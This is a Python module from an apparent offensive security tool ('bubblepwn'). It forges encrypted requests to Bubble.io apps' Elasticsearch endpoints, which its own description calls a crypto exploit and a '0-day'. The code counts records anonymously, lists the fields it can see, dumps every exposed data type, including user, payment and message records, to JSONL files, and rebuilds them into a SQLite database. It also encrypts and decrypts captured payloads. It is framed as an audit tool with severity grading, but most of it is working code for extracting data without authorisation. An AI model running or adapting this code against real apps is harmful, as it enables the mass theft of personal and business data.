"""ES audit module — Tier 0 crypto exploit + Tier 1 privacy-rule checks.

Three subcommands:
  - ``analyze``  : count records per type anonymously via ``/aggregate``
                   (optional: ``--compare`` anon vs auth to catch always-true /
                   empty-equals-empty rules, ``--field-leak`` to dump visible
                   ``_source`` keys per type).
  - ``dumpone T``: paginate ``/search`` on a single type until ``at_end`` and
                   write one JSONL file.
  - ``dumpall``  : run ``analyze`` then ``dumpone`` on every exposed type.
                   Gated behind ``--confirm``.

Flags shared across subcommands:
  --appname X      Override the Bubble app slug (default: ``ctx.schema.env_name``)
  --app-version V  ``live`` (default) or ``test``
  --branch B       ``live`` or ``test`` (URL branch, independent of app_version)
  --endpoint E     ``aggregate`` | ``search`` (switch for analyze; dumps always use search)
  --batch          Use ``/maggregate`` to batch count requests
  --compare        Also query authenticated (needs ``ctx.session``)
  --field-leak     Dump one record per exposed type to list visible fields
  --auth           Force authenticated requests for dumpone/dumpall
  --confirm        Required for ``dumpall``
"""
from __future__ import annotations

import json
import re
from pathlib import Path
from typing import Any, Optional

from bubblepwn.bubble.es import payload as pl
from bubblepwn.bubble.es.transport import EsTransport
from bubblepwn.context import Context, Finding
from bubblepwn.modules.base import Module, parse_flags, register
from bubblepwn.ui import console, panel, progress_iter


def _normalize_type(raw: str) -> str:
    """Accept 'custom.foo', 'foo' or 'user' → canonical form for ES payloads."""
    if raw == "user" or raw.startswith("custom.") or raw.startswith("option."):
        return raw
    return f"custom.{raw}"


# ── Per-type severity classifier ────────────────────────────────────────
#
# Rules (strict narrowing, critical reserved for true PII / credentials):
#
#   critical
#     - a field visible in `_source` contains a PII fragment
#       (email, phone, ssn, password, token, iban, siret, stripe, card_, ...)
#     - OR the type name is a strict PII/credentials noun
#       (`user`, `customer`, `employee`, `personnel`, `profile`,
#        `credential`, `password`, `payment`, `invoice`, `billing`,
#        `subscription`, `kyc`, `passport`,
#        `message`, `conversation`, `chat` — user-private content)
#
#   high
#     - the type name is a sensitive business noun
#       (`document`, `report`, `contract`, `upload`, `email`, `comment`,
#        `token`, `reset`, `organization`, `tenant`, `permission`,
#        `role`, `acl`, `audit`, `log`, `transaction`, `order`, `client_`)
#     - OR record count ≥ 1000 (bulk data is sensitive regardless of label)
#
#   medium (with "may be legitimately public" warning)
#     - anything else with record_count > 0
#
# Meta / reference / enum prefixes are NEVER escalated on name alone
# (``type_client`` is "types of client", not customer records).

_NAME_META_PREFIXES = (
    "type_", "role_", "status_", "kind_", "category_", "tag_",
    "secteur_", "theme_", "thematique_",
)

_NAME_CRITICAL = (
    "user", "customer", "member", "employee", "personnel", "staff",
    "profile",
    "credential", "password",
    "payment", "invoice", "billing", "subscription",
    "identity", "kyc", "passport",
    # user-private content
    "message", "conversation", "chat",
)

_NAME_HIGH = (
    "document", "report", "contract", "file", "upload",
    "email", "comment",
    "token", "reset", "verif",
    "organization", "company", "tenant", "workspace",
    "permission", "role", "acl", "privilege",
    "audit", "log", "event",
    "transaction", "order", "client_",
)

_FIELD_PII = (
    "mail", "phone", "ssn", "dob", "birth",
    "password", "token", "secret", "apikey", "api_key",
    "siret", "iban", "stripe", "card_",
    "passport", "address",
)


def _name_has(name: str, pattern: str) -> bool:
    """`name_has("custom.user_123", "user")` → True.

    Matches as a whole underscore-separated token, or as a substring only
    for long patterns (≥ 7 chars) to avoid false positives.
    """
    parts = name.split("_")
    if pattern in parts:
        return True
    if len(pattern) >= 7 and pattern in name:
        return True
    return False


def classify_type_severity(
    raw_type: str, record_count: int, fields_visible: list[str]
) -> tuple[str, str, bool]:
    """Return ``(severity, reason, may_be_legitimate)``.

    ``may_be_legitimate`` is True only for medium findings that do not hit
    any of the critical / high name or field patterns — the module appends
    a reminder to the finding detail so the reviewer checks manually
    before reporting.
    """
    name = raw_type.lower().replace("custom.", "")

    # 1) Visible PII fields → always critical
    if fields_visible:
        for f in fields_visible:
            lf = f.lower()
            for pat in _FIELD_PII:
                if pat in lf:
                    return (
                        "critical",
                        f"PII-like field visible in `_source`: `{f}`",
                        False,
                    )

    # 2) Check for meta / reference / enum prefixes first — these should
    # NOT escalate on name alone.
    is_meta = any(name.startswith(prefix) for prefix in _NAME_META_PREFIXES)

    # 3) Strict critical name patterns
    if not is_meta:
        for pat in _NAME_CRITICAL:
            if _name_has(name, pat):
                return (
                    "critical",
                    f"type name matches PII pattern `{pat}`",
                    False,
                )

    # 4) High: sensitive business noun
    for pat in _NAME_HIGH:
        if _name_has(name, pat):
            return (
                "high",
                f"type name matches elevated pattern `{pat}`",
                False,
            )

    # 5) High: bulk exposure
    if record_count >= 1000:
        return (
            "high",
            f"{record_count} records exposed — bulk data leakage",
            False,
        )

    # 6) Medium: exposed but may be legitimate
    if record_count > 0:
        return (
            "medium",
            f"{record_count} record(s) exposed",
            True,
        )

    return "info", "no records", False


@register
class EsAudit(Module):
    name = "es-audit"
    description = (
        "Bubble Elasticsearch crypto exploit (PBKDF2-MD5x7 + constant IVs "
        "`po9`/`fl1`). Count, dump, forge, decrypt — the core primitive."
    )
    needs_auth = False
    category = "exploit"
    subcommands = (
        "probe", "analyze", "dumpone <type>", "dumpall",
        "sqlite [path]",
        "query <endpoint> '<json>'",
        "encrypt '<json>' [--appname slug]",
        "decrypt <y> <x> <z> --appname slug",
    )
    flags = (
        "--compare", "--field-leak", "--batch", "--branch test",
        "--endpoint aggregate|search", "--types t1,t2", "--confirm",
        "--auth", "--batch-size <N>", "--max <N>",
        "--appname <slug>", "--sqlite",
    )
    example = "run es-audit dumpall --confirm --sqlite"

    async def run(self, ctx: Context, **kwargs: Any) -> None:
        argv: list[str] = kwargs.get("argv", [])
        flags, positional = parse_flags(argv)
        sub = positional[0].lower() if positional else "analyze"

        # Pure-crypto utilities — no target / no network needed.
        if sub == "decrypt":
            self._decrypt_triple(flags, positional)
            return
        if sub == "encrypt":
            self._encrypt_payload(flags, positional, ctx)
            return

        if ctx.target is None:
            console.print("[red]No target set.[/] Use `target <url>` first.")
            return

        appname = str(flags.get("appname") or ctx.schema.env_name or "")
        if not appname:
            console.print(
                "[red]Cannot determine appname.[/] "
                "Run `run fingerprint` first or pass `--appname X`."
            )
            return
        app_version = str(flags.get("app_version") or ctx.schema.app_version or "live")
        branch = "test" if str(flags.get("branch", "")).lower() == "test" else "live"

        anon = EsTransport(ctx.target.url, appname, cookies=None, branch=branch)
        auth: Optional[EsTransport] = None
        if ctx.session and ctx.session.cookies:
            auth = EsTransport(
                ctx.target.url, appname,
                cookies=ctx.session.cookies, branch=branch,
            )

        if sub == "probe":
            await self._probe(ctx, anon, auth, app_version)
        elif sub == "analyze":
            await self._analyze(ctx, anon, auth, app_version, flags)
        elif sub == "dumpone":
            if len(positional) < 2:
                console.print("[red]usage:[/] run es-audit dumpone <type>")
                return
            await self._dumpone(ctx, anon, auth, app_version, positional[1], flags)
        elif sub == "dumpall":
            if not flags.get("confirm"):
                console.print(
                    "[red]dumpall is destructive (high data volume).[/] "
                    "Pass `--confirm` to proceed."
                )
                return
            await self._dumpall(ctx, anon, auth, app_version, flags)
            if flags.get("sqlite"):
                self._sqlite(ctx, positional, flags)
        elif sub == "query":
            await self._query(ctx, anon, auth, positional, flags)
        elif sub == "sqlite":
            self._sqlite(ctx, positional, flags)
        else:
            console.print(
                f"[red]unknown subcommand:[/] {sub}  "
                "(probe|analyze|dumpone|dumpall|sqlite|query|encrypt|decrypt)"
            )

    # ── probe ────────────────────────────────────────────────────────────

    async def _probe(
        self,
        ctx: Context,
        anon: EsTransport,
        auth: Optional[EsTransport],
        app_version: str,
    ) -> None:
        """Send a single forged /aggregate count request to prove the exploit."""
        panel(
            "es-audit — probe",
            (
                f"Sending one forged [bold]/elasticsearch/aggregate[/] request "
                f"with [cyan]X-Bubble-Appname: {anon.appname}[/] "
                f"(branch={anon.branch}). A 200 response with a `count` field "
                "proves the crypto envelope is accepted and the endpoint is "
                "reachable without auth."
            ),
            style="cyan",
        )
        candidate = "user"
        for raw in sorted(ctx.schema.types.keys()):
            candidate = raw
            break
        body = pl.build_aggregate_count(anon.appname, candidate, app_version=app_version)
        status, resp = await anon.request("aggregate", body)
        console.print(f"[bold]type      [/] [cyan]{candidate}[/]")
        console.print(f"[bold]status    [/] {status}")
        console.print(f"[bold]response  [/] {resp}")

        if status == 200 and isinstance(resp, dict) and "count" in resp:
            ctx.add_finding(Finding(
                module=self.name,
                severity="critical",
                title=(
                    "Bubble Elasticsearch crypto envelope accepted — "
                    "0-day confirmed"
                ),
                detail=(
                    f"`/elasticsearch/aggregate` returned a valid count for "
                    f"type `{candidate}` using only the public "
                    f"`X-Bubble-Appname` header. No authentication required. "
                    "Any data type without a correct privacy rule is "
                    "readable by anyone."
                ),
                data={
                    "type": candidate,
                    "count": resp.get("count"),
                    "appname": anon.appname,
                    "branch": anon.branch,
                },
            ))
            console.print(
                f"\n[bold red]✓ exploit confirmed[/] — "
                f"{resp.get('count')} record(s) counted on `{candidate}` "
                "without authentication."
            )
        else:
            console.print(
                "\n[yellow]exploit inconclusive[/] — endpoint responded but "
                "no `count` field; try `run es-audit analyze` for the full sweep."
            )

    # ── query ────────────────────────────────────────────────────────────

    async def _query(
        self,
        ctx: Context,
        anon: EsTransport,
        auth: Optional[EsTransport],
        positional: list[str],
        flags: dict[str, Any],
    ) -> None:
        """Send an arbitrary encrypted payload to any ES endpoint."""
        if len(positional) < 3:
            console.print(
                "[red]usage:[/] run es-audit query <endpoint> '<json payload>'  "
                "(endpoint: aggregate|search|msearch|maggregate|mget|bulk_watch)"
            )
            return
        endpoint = positional[1]
        payload_raw = positional[2]
        try:
            payload = json.loads(payload_raw)
        except json.JSONDecodeError as exc:
            console.print(f"[red]invalid JSON payload:[/] {exc}")
            return
        transport = auth if (flags.get("auth") and auth) else anon
        panel(
            f"es-audit — query /elasticsearch/{endpoint}",
            f"appname={transport.appname}  ·  branch={transport.branch}  ·  "
            f"auth={'yes' if transport is auth else 'no'}",
            style="cyan",
        )
        status, resp = await transport.request(endpoint, payload)
        console.print(f"[bold]status[/] {status}")
        body = (
            json.dumps(resp, indent=2, ensure_ascii=False, default=str)
            if not isinstance(resp, str) else resp
        )
        if len(body) > 4000:
            body = body[:4000] + "\n... (truncated)"
        console.print(body)

    # ── decrypt / encrypt utilities ──────────────────────────────────────

    def _decrypt_triple(
        self, flags: dict[str, Any], positional: list[str]
    ) -> None:
        """Decrypt a captured {y, x, z} triple. No target/network needed."""
        from bubblepwn.bubble.es.crypto import unwrap_triple

        appname = str(flags.get("appname") or "")
        if not appname:
            console.print(
                "[red]usage:[/] run es-audit decrypt --appname <slug> <y> <x> <z>  "
                "(y,x,z are the base64 fields from a captured request body)"
            )
            return
        if len(positional) < 4:
            console.print(
                "[red]usage:[/] run es-audit decrypt --appname <slug> <y> <x> <z>"
            )
            return
        y, x, z = positional[1], positional[2], positional[3]
        try:
            ts, iv, pt = unwrap_triple(appname, {"y": y, "x": x, "z": z})
        except Exception as exc:
            console.print(f"[red]decryption failed:[/] {exc}")
            return
        panel(
            "es-audit — decrypt",
            (
                f"appname={appname}\n"
                f"timestamp={ts.decode('utf-8', errors='replace')}\n"
                f"iv_material={iv.decode('utf-8', errors='replace')}"
            ),
            style="cyan",
        )
        try:
            parsed = json.loads(pt)
            console.print(json.dumps(parsed, indent=2, ensure_ascii=False))
        except json.JSONDecodeError:
            console.print(pt.decode("utf-8", errors="replace"))

    def _encrypt_payload(
        self,
        flags: dict[str, Any],
        positional: list[str],
        ctx: Context,
    ) -> None:
        """Encrypt an arbitrary JSON payload into a {y, x, z} triple."""
        from bubblepwn.bubble.es.crypto import wrap_triple

        appname = str(flags.get("appname") or ctx.schema.env_name or "")
        if not appname:
            console.print(
                "[red]usage:[/] run es-audit encrypt --appname <slug> '<json payload>'"
            )
            return
        if len(positional) < 2:
            console.print(
                "[red]usage:[/] run es-audit encrypt [--appname <slug>] '<json payload>'"
            )
            return
        payload_raw = positional[1]
        try:
            parsed = json.loads(payload_raw)
        except json.JSONDecodeError as exc:
            console.print(f"[red]invalid JSON payload:[/] {exc}")
            return
        body_bytes = json.dumps(parsed, separators=(",", ":")).encode("utf-8")
        triple = wrap_triple(appname, body_bytes)
        panel(
            "es-audit — encrypt",
            f"appname={appname}  ·  payload_size={len(body_bytes)}B",
            style="cyan",
        )
        console.print(json.dumps(triple, indent=2))

    # ── analyze ──────────────────────────────────────────────────────────

    async def _analyze(
        self,
        ctx: Context,
        anon: EsTransport,
        auth: Optional[EsTransport],
        app_version: str,
        flags: dict[str, Any],
    ) -> None:
        types = sorted(ctx.schema.types.keys())
        if not types:
            console.print(
                "[yellow]No types in schema.[/] Run `run datatypes` first "
                "(or use `run es-audit analyze --types type1,type2`)."
            )
            explicit = flags.get("types")
            if isinstance(explicit, str):
                types = [t.strip() for t in explicit.split(",") if t.strip()]
            if not types:
                return

        compare = bool(flags.get("compare")) and auth is not None
        field_leak = bool(flags.get("field_leak"))
        endpoint = str(flags.get("endpoint") or "aggregate").lower()
        use_maggregate = bool(flags.get("batch")) and endpoint == "aggregate"

        panel(
            "ES audit — analyze",
            f"appname={anon.appname}  ·  branch={anon.branch}  ·  "
            f"types={len(types)}  ·  endpoint={endpoint}  ·  "
            f"compare={compare}  ·  field_leak={field_leak}  ·  batch={use_maggregate}",
            style="cyan",
        )

        # Count anonymously
        if use_maggregate:
            counts_anon = await self._batch_count(anon, app_version, types)
        else:
            counts_anon = await self._sequential_count(
                anon, app_version, types, endpoint
            )

        counts_auth: dict[str, Optional[int]] = {}
        if compare:
            console.print("[cyan]→[/] re-running with authenticated cookies…")
            if use_maggregate:
                counts_auth = await self._batch_count(auth, app_version, types)  # type: ignore[arg-type]
            else:
                counts_auth = await self._sequential_count(
                    auth, app_version, types, endpoint  # type: ignore[arg-type]
                )

        leaked_fields: dict[str, list[str]] = {}
        if field_leak:
            for t in types:
                if (counts_anon.get(t) or 0) > 0:
                    leaked_fields[t] = await self._probe_fields(anon, app_version, t)

        self._render_analyze(types, counts_anon, counts_auth, leaked_fields, compare)
        self._push_findings_analyze(ctx, counts_anon, counts_auth, leaked_fields)

    async def _sequential_count(
        self,
        transport: EsTransport,
        app_version: str,
        types: list[str],
        endpoint: str,
    ) -> dict[str, Optional[int]]:
        results: dict[str, Optional[int]] = {}
        with progress_iter(f"/{endpoint} counts", len(types)) as bar:
            for t in types:
                tname = _normalize_type(t)
                bar.set_description(f"/{endpoint} · {tname[:40]}")
                count = None
                if endpoint == "aggregate":
                    body = pl.build_aggregate_count(
                        transport.appname, tname, app_version=app_version
                    )
                    status, resp = await transport.request("aggregate", body)
                    if status == 200 and isinstance(resp, dict) and "count" in resp:
                        count = int(resp["count"])
                else:  # fallback: search with large n to estimate
                    body = pl.build_search(
                        transport.appname, tname, app_version=app_version, n=1000
                    )
                    status, resp = await transport.request("search", body)
                    if status == 200 and isinstance(resp, dict):
                        hits = (resp.get("hits") or {}).get("hits") or []
                        count = len(hits) if resp.get("at_end") else max(len(hits), 1000)
                results[t] = count
                bar.advance()
        return results

    async def _batch_count(
        self, transport: EsTransport, app_version: str, types: list[str]
    ) -> dict[str, Optional[int]]:
        # maggregate accepts a list of aggregate payloads
        normalized = [_normalize_type(t) for t in types]
        body = pl.build_maggregate_counts(
            transport.appname, normalized, app_version=app_version
        )
        status, resp = await transport.request("maggregate", body)
        results: dict[str, Optional[int]] = {t: None for t in types}
        if status != 200 or not isinstance(resp, dict):
            console.print(f"[yellow]maggregate failed (status={status}) — falling back[/]")
            return await self._sequential_count(transport, app_version, types, "aggregate")
        responses = resp.get("responses") or []
        if len(responses) != len(types):
            console.print(
                f"[yellow]maggregate response count mismatch "
                f"({len(responses)}/{len(types)}) — falling back[/]"
            )
            return await self._sequential_count(transport, app_version, types, "aggregate")
        for t, r in zip(types, responses):
            if isinstance(r, dict) and "count" in r:
                results[t] = int(r["count"])
        return results

    async def _probe_fields(
        self, transport: EsTransport, app_version: str, raw_type: str
    ) -> list[str]:
        tname = _normalize_type(raw_type)
        body = pl.build_search(transport.appname, tname, app_version=app_version, n=1)
        status, resp = await transport.request("search", body)
        if status != 200 or not isinstance(resp, dict):
            return []
        hits = (resp.get("hits") or {}).get("hits") or []
        if not hits:
            return []
        source = hits[0].get("_source") or {}
        return sorted(source.keys())

    def _render_analyze(
        self,
        types: list[str],
        anon: dict[str, Optional[int]],
        auth: dict[str, Optional[int]],
        leaks: dict[str, list[str]],
        compare: bool,
    ) -> None:
        from rich.table import Table

        table = Table(header_style="bold cyan", border_style="dim")
        table.add_column("Type", style="cyan", no_wrap=True, overflow="fold")
        table.add_column("Count anon", justify="right")
        if compare:
            table.add_column("Count auth", justify="right")
            table.add_column("Δ", justify="right", style="magenta")
        if leaks:
            table.add_column("Fields visible (anon)", overflow="fold", style="dim")
        table.add_column("Verdict", style="bold")

        total_exposed = 0
        total_records = 0
        for t in types:
            a = anon.get(t)
            row = [t, "-" if a is None else f"{a}"]
            if compare:
                b = auth.get(t)
                row.append("-" if b is None else f"{b}")
                if a is not None and b is not None:
                    row.append(f"{b - a:+d}" if b != a else "=")
                else:
                    row.append("?")
            if leaks:
                row.append(",".join(leaks.get(t, [])[:8]) or "")
            if a is not None and a > 0:
                row.append("[red]EXPOSED[/]")
                total_exposed += 1
                total_records += a
            elif a == 0:
                row.append("[green]empty/denied[/]")
            else:
                row.append("[yellow]error[/]")
            table.add_row(*row)
        console.print(table)
        console.print(
            f"\n[bold]Summary:[/] {total_exposed} exposed type(s) · "
            f"{total_records} record(s) total visible anonymously"
        )

    def _push_findings_analyze(
        self,
        ctx: Context,
        anon: dict[str, Optional[int]],
        auth: dict[str, Optional[int]],
        leaks: dict[str, list[str]],
    ) -> None:
        exposed = [(t, c) for t, c in anon.items() if c is not None and c > 0]
        if not exposed:
            return

        total = sum(c for _, c in exposed)
        biggest = sorted(exposed, key=lambda x: -x[1])[:5]

        # 1) Summary finding — always critical when any type leaks.
        ctx.add_finding(Finding(
            module=self.name,
            severity="critical",
            title=(
                f"ES crypto bypass confirmed: {len(exposed)} type(s) leaking "
                f"{total} record(s) anonymously"
            ),
            detail=(
                "Anonymous reads succeed via /elasticsearch/aggregate using "
                "only the public `X-Bubble-Appname` header. Biggest exposures: "
                + ", ".join(f"`{t}`({c})" for t, c in biggest)
            ),
            data={"types": exposed, "total_records": total},
        ))

        # 2) Per-type finding — severity classified by type name + fields.
        for t, count in exposed:
            fields = leaks.get(t) or []
            sev, reason, may_be_legit = classify_type_severity(
                t, count, fields
            )
            detail_bits = [
                f"{count} record(s) readable via `/elasticsearch/aggregate` "
                "without authentication.",
                f"Severity: **{sev}** — {reason}.",
            ]
            if fields:
                shown = ", ".join(f"`{f}`" for f in fields[:12])
                more = f" (+{len(fields) - 12} more)" if len(fields) > 12 else ""
                detail_bits.append(f"Fields visible in `_source`: {shown}{more}.")
            if may_be_legit:
                detail_bits.append(
                    "⚠ **May be legitimately public** — review manually "
                    "before reporting. Common benign cases: reference / "
                    "lookup tables, option-set mirrors, i18n dictionaries, "
                    "feature-flag registries. Flag as a real leak only if "
                    "the records contain business or user data."
                )
            ctx.add_finding(Finding(
                module=self.name,
                severity=sev,
                title=f"`{t}` readable anonymously — {count} record(s)",
                detail="\n\n".join(detail_bits),
                data={
                    "type": t,
                    "count": count,
                    "fields_visible": fields[:30],
                    "severity_reason": reason,
                    "may_be_legitimate": may_be_legit,
                },
            ))

        # 3) Tautology / empty-equals-empty suspects (authed comparison).
        for t in anon:
            a, b = anon.get(t), auth.get(t)
            if a is None or b is None:
                continue
            if a > 0 and a == b:
                ctx.add_finding(Finding(
                    module=self.name,
                    severity="high",
                    title=f"Privacy rule tautology suspect on `{t}` ({a})",
                    detail=(
                        "Identical record count for anonymous and "
                        "authenticated sessions suggests an always-true rule "
                        "or an empty-equals-empty comparison."
                    ),
                    data={"type": t, "count": a},
                ))

    # ── dump ─────────────────────────────────────────────────────────────

    async def _dumpone(
        self,
        ctx: Context,
        anon: EsTransport,
        auth: Optional[EsTransport],
        app_version: str,
        target_type: str,
        flags: dict[str, Any],
    ) -> None:
        use_auth = bool(flags.get("auth")) and auth is not None
        transport = auth if use_auth else anon
        raw_type = _normalize_type(target_type)
        n_per = int(flags.get("batch_size", 1000))
        max_total = int(flags.get("max", 1_000_000))

        out_dir = Path("out") / ctx.target.host / "es"
        out_dir.mkdir(parents=True, exist_ok=True)
        safe_name = raw_type.replace("/", "_").replace(":", "_")
        out_file = out_dir / f"{safe_name}.jsonl"

        total = 0
        from_ = 0
        with out_file.open("w", encoding="utf-8") as fh:
            with console.status(
                f"[cyan]dumping[/] {raw_type} → {out_file.name}", spinner="dots"
            ) as status_widget:
                while total < max_total:
                    body = pl.build_search(
                        transport.appname, raw_type,
                        app_version=app_version, n=n_per, from_=from_,
                    )
                    status, resp = await transport.request("search", body)
                    if status != 200 or not isinstance(resp, dict):
                        console.print(
                            f"\n[red]stopped at from={from_}[/]  status={status}  "
                            f"body={str(resp)[:200]}"
                        )
                        break
                    hits = (resp.get("hits") or {}).get("hits") or []
                    for h in hits:
                        fh.write(json.dumps(h, ensure_ascii=False) + "\n")
                        total += 1
                    from_ += len(hits)
                    status_widget.update(
                        f"[cyan]dumping[/] {raw_type} — {total} records"
                    )
                    if resp.get("at_end") or not hits:
                        break

        console.print(
            f"[green]✓[/] {total} records · {raw_type} → [cyan]{out_file}[/]"
        )
        ctx.add_finding(Finding(
            module=self.name,
            severity="high" if total > 0 and not use_auth else "info",
            title=(
                f"Dumped {total} records from {raw_type}"
                + (" [anon]" if not use_auth else " [auth]")
            ),
            data={
                "type": raw_type,
                "count": total,
                "file": str(out_file),
                "auth": use_auth,
            },
        ))

    async def _dumpall(
        self,
        ctx: Context,
        anon: EsTransport,
        auth: Optional[EsTransport],
        app_version: str,
        flags: dict[str, Any],
    ) -> None:
        types = sorted(ctx.schema.types.keys())
        if not types:
            console.print("[yellow]No types in schema.[/] Run `run datatypes` first.")
            return

        console.print(f"[cyan]→[/] discovering exposed types ({len(types)} candidates)…")
        counts = await self._sequential_count(anon, app_version, types, "aggregate")
        exposed = [(t, c) for t, c in counts.items() if c and c > 0]
        total_est = sum(c for _, c in exposed)
        console.print(
            f"[bold]Will dump {len(exposed)} types · ~{total_est} records total[/]"
        )
        for t, _ in exposed:
            await self._dumpone(ctx, anon, auth, app_version, t, flags)

    # ── sqlite ───────────────────────────────────────────────────────────

    def _sqlite(
        self,
        ctx: Context,
        positional: list[str],
        flags: dict[str, Any],
    ) -> None:
        """Rebuild a SQLite DB from the JSONL dumps in ``out/<host>/es/``.

        One table per Bubble data type. Column types are inferred from the
        Bubble field-name suffix (``_number``, ``_boolean``, ``_date``,
        ``___<type>``) and from the JSON value shape. Reference-style fields
        (``<creator>__LOOKUP__<target_id>``) get a companion
        ``<field>__ref_id`` column with the extracted target id so joins
        are direct.
        """
        import sqlite3
        from pathlib import Path as _Path

        if ctx.target is None:
            console.print("[red]no target set[/]")
            return

        dump_dir = _Path("out") / ctx.target.host / "es"
        if not dump_dir.exists() or not any(dump_dir.glob("*.jsonl")):
            console.print(
                f"[yellow]No dumps at {dump_dir}[/]. Run "
                "[cyan]es-audit dumpone <type>[/] or [cyan]dumpall --confirm[/] first."
            )
            return

        # Positional: subcommand at [0], optional output path at [1].
        default_db = _Path("out") / ctx.target.host / "es.sqlite"
        out_db = _Path(positional[1]) if len(positional) > 1 else default_db
        out_db.parent.mkdir(parents=True, exist_ok=True)
        if out_db.exists():
            out_db.unlink()

        panel(
            "es-audit — sqlite",
            f"reading  [cyan]{dump_dir}/*.jsonl[/]\n"
            f"building [cyan]{out_db}[/]",
            style="cyan",
        )

        conn = sqlite3.connect(out_db)
        conn.execute("PRAGMA journal_mode = WAL")
        stats: list[dict[str, Any]] = []

        jsonl_files = sorted(dump_dir.glob("*.jsonl"))
        from bubblepwn.ui import progress_iter
        with progress_iter("Importing JSONL", len(jsonl_files)) as bar:
            for f in jsonl_files:
                type_name = f.stem
                table = _safe_table_name(type_name)
                bar.set_description(f"{table}")
                try:
                    rows, cols = _import_jsonl_into_sqlite(conn, f, table)
                except Exception as exc:
                    console.print(f"[yellow]![/] {type_name}: {exc}")
                    bar.advance()
                    continue
                stats.append({
                    "type": type_name, "table": table,
                    "rows": rows, "columns": cols,
                })
                bar.advance()

        conn.commit()
        conn.close()

        # Render summary
        from rich.table import Table as RichTable
        t = RichTable(header_style="bold cyan", border_style="dim")
        t.add_column("Type", style="cyan", no_wrap=True, overflow="fold")
        t.add_column("Table", style="magenta", no_wrap=True)
        t.add_column("Rows", justify="right")
        t.add_column("Columns", justify="right")
        total_rows = 0
        for s in sorted(stats, key=lambda x: -x["rows"]):
            t.add_row(s["type"], s["table"], str(s["rows"]), str(s["columns"]))
            total_rows += s["rows"]
        console.print(t)
        console.print(
            f"\n[green]✓[/] {len(stats)} table(s) · {total_rows} row(s) · "
            f"[cyan]{out_db}[/]"
        )
        console.print(
            "[dim]Open with `sqlite3 "
            f"{out_db}` or any SQLite GUI. Join example:\n"
            "  SELECT u.* FROM t_user u JOIN t_custom_<some_type> d "
            '  ON u._id = d."Created By__ref_id";[/]'
        )

        ctx.add_finding(Finding(
            module=self.name,
            severity="info",
            title=f"Rebuilt SQLite database ({len(stats)} tables, {total_rows} rows)",
            detail=f"Output: {out_db}",
            data={"path": str(out_db), "tables": stats},
        ))


# ── SQLite helpers (module-level, no `self`) ─────────────────────────────

_SQL_KEYWORDS = {
    "user", "group", "order", "select", "insert", "update", "delete",
    "table", "index", "view", "from", "where", "join",
}


def _safe_table_name(raw_type: str) -> str:
    """``custom.user`` → ``t_custom_user``. Always-prefix to avoid SQL keywords."""
    slug = re.sub(r"[^a-zA-Z0-9_]", "_", raw_type).strip("_")
    return f"t_{slug}" if slug else "t_unnamed"


_BUBBLE_SUFFIX_TO_SQL = {
    "text": "TEXT",
    "number": "REAL",
    "boolean": "INTEGER",
    "date": "INTEGER",
    "image": "TEXT",
    "file": "TEXT",
    "option": "TEXT",
    "list": "TEXT",
    "geographic_address": "TEXT",
}


def _infer_sql_type(field_name: str, sample_value: Any) -> str:
    """Guess SQLite column type from field name suffix or value."""
    # Explicit Bubble suffix: `___<type>` or `_<type>` at end
    m = re.search(r"___([a-z_]+)$|_(text|number|boolean|date|image|file|option|list)$",
                  field_name)
    if m:
        suffix = m.group(1) or m.group(2)
        if suffix in _BUBBLE_SUFFIX_TO_SQL:
            return _BUBBLE_SUFFIX_TO_SQL[suffix]
    # Special well-known names
    lname = field_name.lower()
    if lname in ("created date", "modified date", "_version"):
        return "INTEGER"
    # Fallback on JSON value type
    if isinstance(sample_value, bool):
        return "INTEGER"
    if isinstance(sample_value, int):
        return "INTEGER"
    if isinstance(sample_value, float):
        return "REAL"
    return "TEXT"


def _split_lookup(value: Any) -> Optional[str]:
    """Extract the target id from ``<creator>__LOOKUP__<target_id>`` pattern."""
    if not isinstance(value, str):
        return None
    idx = value.find("__LOOKUP__")
    if idx < 0:
        return None
    return value[idx + len("__LOOKUP__"):]


def _import_jsonl_into_sqlite(
    conn: Any, jsonl_path: Any, table: str
) -> tuple[int, int]:
    """Return ``(rows_inserted, total_columns)``."""
    # Read every record first to finalise the schema (some columns only
    # appear in later records).
    records: list[dict[str, Any]] = []
    with jsonl_path.open(encoding="utf-8") as fh:
        for line in fh:
            line = line.strip()
            if not line:
                continue
            try:
                rec = json.loads(line)
            except json.JSONDecodeError:
                continue
            # A dump entry may be a full hit envelope ({_source: {...}, _id,...})
            # or already a flat record.
            source = rec.get("_source") if isinstance(rec, dict) and "_source" in rec else rec
            if isinstance(source, dict):
                records.append(source)
    if not records:
        return 0, 0

    # Collect columns + infer types, then add companion *__ref_id* columns
    # for every __LOOKUP__ field encountered.
    sample_by_col: dict[str, Any] = {}
    has_lookup: set[str] = set()
    for rec in records:
        for k, v in rec.items():
            if k not in sample_by_col and v is not None:
                sample_by_col[k] = v
            if _split_lookup(v) is not None:
                has_lookup.add(k)

    columns: dict[str, str] = {}
    for col, sample in sample_by_col.items():
        columns[col] = _infer_sql_type(col, sample)
    # Ensure _id, if present, is the primary key
    for k in list(records[0].keys()):
        if k not in columns:
            columns[k] = "TEXT"

    lookup_cols = {f"{k}__ref_id": "TEXT" for k in has_lookup}
    all_cols = {**columns, **lookup_cols}

    # Quote for DDL / DML safety
    cols_ddl = ", ".join(f'"{c}" {t}' for c, t in all_cols.items())
    # Add PRIMARY KEY on _id if the column exists
    if "_id" in all_cols:
        cols_ddl += ', PRIMARY KEY ("_id")'
    conn.execute(f'DROP TABLE IF EXISTS "{table}"')
    conn.execute(f'CREATE TABLE "{table}" ({cols_ddl})')

    col_names = list(all_cols.keys())
    placeholders = ",".join("?" for _ in col_names)
    quoted = ",".join(f'"{c}"' for c in col_names)
    stmt = f'INSERT OR IGNORE INTO "{table}" ({quoted}) VALUES ({placeholders})'

    rows: list[tuple[Any, ...]] = []
    for rec in records:
        row: list[Any] = []
        for c in col_names:
            if c.endswith("__ref_id"):
                src_col = c[: -len("__ref_id")]
                row.append(_split_lookup(rec.get(src_col)))
                continue
            v = rec.get(c)
            if isinstance(v, (dict, list)):
                v = json.dumps(v, ensure_ascii=False)
            elif isinstance(v, bool):
                v = 1 if v else 0
            row.append(v)
        rows.append(tuple(row))

    conn.executemany(stmt, rows)
    return len(rows), len(all_cols)
